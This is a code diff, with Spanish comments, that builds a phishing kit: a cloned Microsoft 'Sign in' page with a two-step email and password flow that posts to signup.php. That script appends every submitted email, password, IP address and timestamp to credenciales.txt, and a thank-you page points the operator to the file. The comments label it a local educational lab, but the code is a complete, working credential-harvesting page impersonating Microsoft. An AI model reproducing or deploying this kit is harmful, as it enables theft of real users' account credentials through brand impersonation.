@@ -1,106 +1,175 @@
+### --- FILE: index.html --- ###
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <!-- Si tienes style.css en el repo, mantenlo así -->
-  <link rel="stylesheet" href="style.css" />
   <title>Sign in to your Microsoft account (LAB)</title>
   <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
   <style>
-    /* Si no tienes style.css o quieres ver algo básico rápido, este CSS mínimo evita que se vea desordenado */
-    body { font-family: Arial, sans-serif; padding: 24px; }
-    .container { max-width: 420px; margin: 0 auto; }
-    h2 { font-size: 28px; margin: 12px 0; }
-    .form-group input { width: 100%; padding: 8px; box-sizing: border-box; margin-bottom: 12px; }
-    .next-btn, button[type="submit"] { padding: 6px 12px; cursor: pointer; }
-    .forms { transition: transform .3s ease; }
-    .forms.next-form { transform: translateX(-100%); }
-    .forms .first, .forms .second { width: 100%; }
-    .forms .second { display: block; }
-    .bottom { margin-top: 18px; display: flex; gap: 8px; align-items: center; }
-    .arrow-btn { cursor: pointer; margin-right: 8px; }
+    /* CSS embebido: copia todo esto tal cual en index.html */
+    :root{--max-width:480px;--accent:#0067b8}
+    body{font-family:Arial,Helvetica,sans-serif;background:#fff;margin:0;padding:20px;display:flex;justify-content:center}
+    .container{width:100%;max-width:var(--max-width);box-sizing:border-box}
+    img.logo{max-width:160px;display:block;margin:0 0 14px}
+    h2{font-size:26px;margin:8px 0}
+    .form-group{margin-bottom:12px}
+    input[type="email"], input[type="password"], textarea{width:100%;padding:8px 10px;font-size:16px;box-sizing:border-box;border:1px solid #bbb;border-radius:4px}
+    button, .next-btn{background:var(--accent);color:#fff;border:0;padding:8px 12px;border-radius:4px;cursor:pointer;font-size:15px}
+    button[type="button"]{background:#f0f0f0;color:#000;border:1px solid #ccc}
+    a{color:var(--accent);text-decoration:underline}
+    .bottom{margin-top:18px;display:flex;gap:8px;align-items:center}
+    .forms{overflow:hidden;position:relative}
+    .screen{width:100%;box-sizing:border-box;transition:transform .25s ease}
+    .first{padding-bottom:10px}
+    .second{margin-top:18px}
+    .email-display{font-weight:600}
+    .arrow-btn{cursor:pointer;margin-right:8px}
+    .helper{font-size:13px;color:#444;margin-top:6px}
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- form envia a signup.php por POST -->
+    <!-- Formulario que envía a signup.php por POST -->
     <form action="signup.php" method="POST" name="logonForm" autocomplete="off">
-      <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo" style="max-width:140px;">
-      <div class="forms-container">
-        <div class="forms">
-          <!-- PRIMERA PANTALLA -->
-          <div class="first">
-            <h2>Sign in</h2>
-            <div class="form-group">
-              <!-- name="email" necesario para que PHP lo lea -->
-              <input type="email" name="email" placeholder="Email, Phone, or Skype" required>
-            </div>
-            <p>No account? <a href="#">Create One!</a></p>
-            <a href="#">Sign in with a security key <span>?</span></a>
-            <!-- Este botón solo cambia vista a la segunda parte (JS lo maneja) -->
-            <button type="button" class="next-btn">Next</button>
-          </div>
+      <!-- Logo -->
+      <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="logo">
 
-          <!-- SEGUNDA PANTALLA -->
-          <div class="second" style="margin-top:20px;">
-            <p><span class="arrow-btn">&#8592;</span> <span class="email-display">example@test.com</span></p>
-            <h2>Enter password</h2>
-            <div class="form-group">
-              <!-- name="password" necesario para que PHP lo lea -->
-              <input type="password" name="password" placeholder="Password" required>
-            </div>
-            <a href="#">Forgot password?</a>
-            <!-- Este botón es submit: envía el formulario a signup.php -->
-            <button type="submit">Sign in</button>
+      <div class="forms">
+        <!-- PRIMERA PANTALLA -->
+        <div class="screen first" id="screen-first">
+          <h2>Sign in</h2>
+          <div class="form-group">
+            <!-- name="email" NECESARIO para que PHP reciba el valor -->
+            <input type="email" name="email" id="emailInput" placeholder="Email, Phone, or Skype" required>
           </div>
+          <p class="helper">No account? <a href="#">Create One!</a></p>
+          <p class="helper"><a href="#">Sign in with a security key</a></p>
+          <!-- tipo button: no envía, solo avanza a la "segunda pantalla" -->
+          <button type="button" class="next-btn" id="nextBtn">Next</button>
+        </div>
+
+        <!-- SEGUNDA PANTALLA -->
+        <div class="screen second" id="screen-second">
+          <p><span class="arrow-btn" id="backBtn">&#8592;</span> <span class="email-display" id="emailDisplay">example@test.com</span></p>
+          <h2>Enter password</h2>
+          <div class="form-group">
+            <!-- name="password" NECESARIO para que PHP reciba el valor -->
+            <input type="password" name="password" id="passwordInput" placeholder="Password" required>
+          </div>
+          <p class="helper"><a href="#">Forgot password?</a></p>
+          <!-- submit: envía el formulario a signup.php -->
+          <button type="submit">Sign in</button>
         </div>
       </div>
     </form>
 
     <div class="bottom">
-      <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="options" style="max-width:100px;">
+      <img src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" alt="options" style="max-width:90px">
       <span>Sign-in options</span>
     </div>
-  </div>
 
-  <div id="footer" role="contentinfo" class="footer ext-footer" style="margin-top:30px;">
-    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
-      <a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US">Terms of use</a> ·
-      <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US">Privacy &amp; cookies</a>
-      <a id="moreOptions" href="#" style="margin-left:8px;">...</a>
+    <div id="footer" style="margin-top:18px;font-size:13px;color:#666">
+      <a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US">Terms of use</a> ·
+      <a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US">Privacy & cookies</a>
     </div>
   </div>
 
   <script>
-    // JS simple para cambiar entre "pantallas" y mostrar el email ingresado
-    const forms = document.querySelector('.forms');
-    const nextButton = document.querySelector('.next-btn');
-    const arrowButton = document.querySelector('.arrow-btn');
-    const emailInput = document.querySelector('.first input[name="email"]');
-    const emailDisplay = document.querySelector('.email-display');
+    // JS para cambiar vista y mostrar el email ingresado
+    (function(){
+      const nextBtn = document.getElementById('nextBtn');
+      const backBtn = document.getElementById('backBtn');
+      const emailInput = document.getElementById('emailInput');
+      const emailDisplay = document.getElementById('emailDisplay');
+      const screenFirst = document.getElementById('screen-first');
+      const screenSecond = document.getElementById('screen-second');
 
-    nextButton.addEventListener('click', () => {
-      // valida que haya un email mínimo
-      if (!emailInput.value.trim()) {
-        alert('Please enter an email (use a test email).');
-        emailInput.focus();
-        return;
-      }
-      // Transición visual simple
-      forms.classList.add('next-form');
-      emailDisplay.innerText = emailInput.value;
-      // opcional: esconder la parte inferior
-      document.querySelector('.bottom').style.display = 'none';
-    });
+      // Inicial: solo mostrar primera pantalla, ocultar segunda
+      screenFirst.style.display = 'block';
+      screenSecond.style.display = 'none';
 
-    arrowButton.addEventListener('click', () => {
-      forms.classList.remove('next-form');
-      document.querySelector('.bottom').style.display = 'flex';
-    });
+      nextBtn.addEventListener('click', () => {
+        const val = emailInput.value.trim();
+        if (!val) { alert('Please enter an email (use a test email).'); emailInput.focus(); return; }
+        emailDisplay.textContent = val;
+        screenFirst.style.display = 'none';
+        screenSecond.style.display = 'block';
+        window.scrollTo(0,0);
+      });
+
+      backBtn.addEventListener('click', () => {
+        screenSecond.style.display = 'none';
+        screenFirst.style.display = 'block';
+      });
+    })();
   </script>
 </body>
 </html>
+
+### --- FILE: signup.php --- ###
+<?php
+// signup.php - USO EDUCATIVO EN LOCAL / LABORATORIO
+// Guarda en credenciales.txt los datos enviados por POST
+// AVISO: usar solo con datos de prueba en entorno local
+
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    echo "Método no permitido.";
+    exit;
+}
+
+// Leer y sanitizar entradas
+$email = isset($_POST['email']) ? trim($_POST['email']) : '';
+$password = isset($_POST['password']) ? trim($_POST['password']) : '';
+
+// Evitar saltos de línea para no romper el archivo
+$email = str_replace(array("\r", "\n"), '', $email);
+$password = str_replace(array("\r", "\n"), '', $password);
+
+// Datos auxiliares
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+$time = date('Y-m-d H:i:s');
+
+// Línea formateada para guardar
+$line = "[$time] - $ip - EMAIL: {$email} - PASSWORD: {$password}\n";
+
+// Archivo destino (misma carpeta)
+$file = __DIR__ . '/credenciales.txt';
+
+// Escribir con bloqueo seguro
+if (file_put_contents($file, $line, FILE_APPEND | LOCK_EX) === false) {
+    http_response_code(500);
+    echo "Error al escribir archivo.";
+    exit;
+}
+
+// Redirigir a gracias.html
+header('Location: gracias.html');
+exit;
+?>
+
+### --- FILE: gracias.html --- ###
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Gracias</title>
+  <style>body{font-family:Arial;margin:20px}</style>
+</head>
+<body>
+  <h2>Gracias — prueba completada (entorno local)</h2>
+  <p>Revisa el archivo <code>credenciales.txt</code> en la carpeta del proyecto para ver los datos guardados.</p>
+</body>
+</html>
+
+### --- FILE: .gitignore --- ###
+# Evitar subir al repo archivos con datos de prueba o sensibles
+credenciales.txt
+.DS_Store
+node_modules/
+.env
+
 
 
